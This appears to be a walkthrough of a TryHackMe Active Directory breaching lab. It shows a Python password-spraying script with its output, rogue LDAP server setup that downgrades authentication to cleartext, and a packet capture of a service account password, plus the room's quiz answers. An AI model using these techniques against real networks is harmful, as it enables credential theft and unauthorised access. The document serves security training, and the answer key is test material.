## Network Diagram :

![image](https://github.com/user-attachments/assets/a35a439d-bea6-4b15-8a03-6b06485eaa9e)

## Task 1 : Introduction to AD Breaches

- Before we can exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution, we need initial access first. You need to acquire an initial set of valid **AD credentials**.
- Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant.

### Techniques to recover AD credentials in this room -

1. NTLM Authenticated Services
2. LDAP Bind Credentials
3. Authentication Relays
4. Microsoft Deployment Toolkit
5. Configuration Files

## Task 2 : OSINT and Phishing

### OSINT -

OSINT is used to discover information that has been publicly disclosed. In terms of AD credentials, this can happen for several reasons, such as:

- Users who ask questions on public forums such as Stack Overflow but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as Github with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as HaveIBeenPwned and DeHashed provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.

### Phishing -

- Phishing is another excellent method to breach AD.
- Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background.
- This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account.

> 1.  What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach? - `haveibeenpwned`

## Task 3 : NTLM Authenticated Services

- NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM.
- This authentication mechanism is heavily used by the services on a network.
-  However, services that use NetNTLM can also be exposed to the internet.

The following are some of the popular examples:

    1. Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
    2. Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
    3. Exposed VPN endpoints that were integrated with AD.
    4. Web applications that are internet-facing and make use of NetNTLM.

- NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.
- This means that the application is authenticating on behalf of the user and not authenticating the user directly on the application itself. This prevents the application from storing AD credentials, which should only be stored on a Domain Controller. 

![image](https://github.com/user-attachments/assets/e3cfc683-bd38-4052-948a-ec8e1468c523)

### Brute-force Login Attacks -

Since most AD environments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. 


A service is runnning at https://ntlmauth.za.tryhackme.com prompts us for Windows Authentication credentials:

![image](https://github.com/user-attachments/assets/c5146601-2f29-43e9-a5d6-d1249f0dfbfc)

Using the following python script, we can perform password spraying attack

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

**Results**
```bash
┌──(kali㉿kali)-[~/THM/BreachingAD]
└─$ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```
> 1. What is the name of the challenge-response authentication mechanism that uses NTLM? - `netNTLM`
> 
> 2. What is the username of the third valid credential pair found by the password spraying script? - `gordon.stevens`
> 
> 3. How many valid credentials pairs were found by the password spraying script? - `4`
> 
> 4. What is the message displayed by the web application when authenticating with a valid credential pair? - `Hello World`

## Task 4 : LDAP Bind Credentials 

- LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials.
- The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

The authentication process is as follows :


 1. The user provides their credentials (username and password) to the system.
 2. The system sends a bind request to the LDAP server, containing the user’s credentials.
 3. The LDAP server checks the user’s credentials against the data stored in its directory.
 4. If the credentials match, the server sends a success message to the system, indicating that the user has been authenticated.
 5. The system grants the user access to the requested resource.
 6. If the credentials do not match, the server sends a failure message to the system, indicating that the user has not been authenticated.
 7. The system denies the user access to the requested resource.

![image](https://github.com/user-attachments/assets/949ea84e-bb88-4e16-bdf5-e1ee99d4b1ea)

### LDAP Pass-back Attacks -

**LDAP Pass-Back attacks** is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.

- LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified.
- This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`.
- Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server.
- In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

A network printer with web interface is available at http://printer.za.tryhackme.com/settings.aspx .

![image](https://github.com/user-attachments/assets/2d2e289e-08f1-4bcc-b5d5-30f72d5a078c)

Viewing page source , we can see that the username is visible bu the password is hidden.

![image](https://github.com/user-attachments/assets/f36d2fc4-10e8-4621-ab84-01b7e2aacf50)

After updating the **server ip** to our machine ip, once we click **Test Settings** we get a connection back to our netcat.

![image](https://github.com/user-attachments/assets/66a14bc5-d729-42d7-b1a3-22ecb388b868)

> The `supportedCapabilities` response tells us we have a problem.
> 
> Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details. It will use this negotiation to select the most secure authentication method that both the printer and the LDAP server support. If the authentication method is too secure, the credentials will not be transmitted in cleartext. With some authentication methods, the credentials will not be transmitted over the network at all! So we can't just use normal Netcat to harvest the credentials. We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.

**Hosting a Rogue LDAP Server** :

1. Run - `sudo dpkg-reconfigure -p low slapd`
2. Omit OpenLDAP server configuration? No
3. DNS domain name: (AD domain name) i.e. za.tryhackme.com
4. Organization name: (AD domain name) i.e. za.tryhackme.com
5. Confrim with you administrator passwd which done by initial configuration.
6. Do you want the database to be removed when slapd is purged? No
7. Move old database files before creating a new database YES

In order to obtain the clear-text credentials, we must reconfigure our LDAP server to only support the **PLAIN and LOGIN authentication methods**. To do this, we need to create a new LDIF file with the following information:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

> The file has the following properties:
>
> 1. olcSaslSecProps: Specifies the SASL security properties
>   
> 2. noanonymous: Disables mechanisms that support anonymous login
>
> 3. minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

Apply changes & restart the server 

```bash
┌──(kali㉿kali)-[~/THM/BreachingAD]
└─$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```

Verify the modification

```bash
┌──(kali㉿kali)-[~/THM/BreachingAD]
└─$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```
**Capturing LDAP Credentials** :

Start tcp dump on our attacker machine then click on Test settings in the printer page.

```bash
┌──(kali㉿kali)-[~/THM/BreachingAD]
└─$ sudo tcpdump -SX -i breachad tcp port 389

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
09:54:30.531831 IP 10.200.25.201.63885 > 10.50.23.21.ldap: Flags [SEW], seq 3190580035, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 f977 4000 7f06 bc72 0ac8 19c9  E..4.w@....r....
        0x0010:  0a32 1715 f98d 0185 be2c 6343 0000 0000  .2.......,cC....
        0x0020:  80c2 faf0 11b0 0000 0204 0509 0103 0308  ................
        0x0030:  0101 0402                                ....
09:54:30.531848 IP 10.50.23.21.ldap > 10.200.25.201.63885: Flags [S.], seq 3196238520, ack 3190580036, win 32120, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
        0x0000:  4500 0034 0000 4000 4006 f4ec 0a32 1715  E..4..@.@....2..
        0x0010:  0ac8 19c9 0185 f98d be82 bab8 be2c 6344  .............,cD
        0x0020:  8012 7d78 15f2 0000 0204 05b4 0101 0402  ..}x............
        0x0030:  0103 0307                                ....
09:54:30.794970 IP 10.200.25.201.63885 > 10.50.23.21.ldap: Flags [.], ack 3196238521, win 1027, length 0
        0x0000:  4500 0028 f978 4000 7f06 bc7f 0ac8 19c9  E..(.x@.........
        0x0010:  0a32 1715 f98d 0185 be2c 6344 be82 bab9  .2.......,cD....
        0x0020:  5010 0403 d039 0000                      P....9..
09:54:32.102759 IP 10.200.25.201.63887 > 10.50.23.21.ldap: Flags [P.], seq 2693358489:2693358554, ack 1345660156, win 1027, length 65
        0x0000:  4500 0069 f983 4000 7f06 bc33 0ac8 19c9  E..i..@....3....
        0x0010:  0a32 1715 f98f 0185 a089 6399 5035 24fc  .2........c.P5$.
        0x0020:  5018 0403 1cab 0000 3084 0000 003b 0201  P.......0....;..
        0x0030:  0a60 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
        0x0060:  6461 7070 6173 7331 40                   dappass1@
```

> 1. What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? - `LDAP Pass-back attack`
> 
> 2. What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text? - `LOGIN, PLAIN`
> 
> 3. What is the password associated with the svcLDAP account? - `tryhackmeldappass1@`

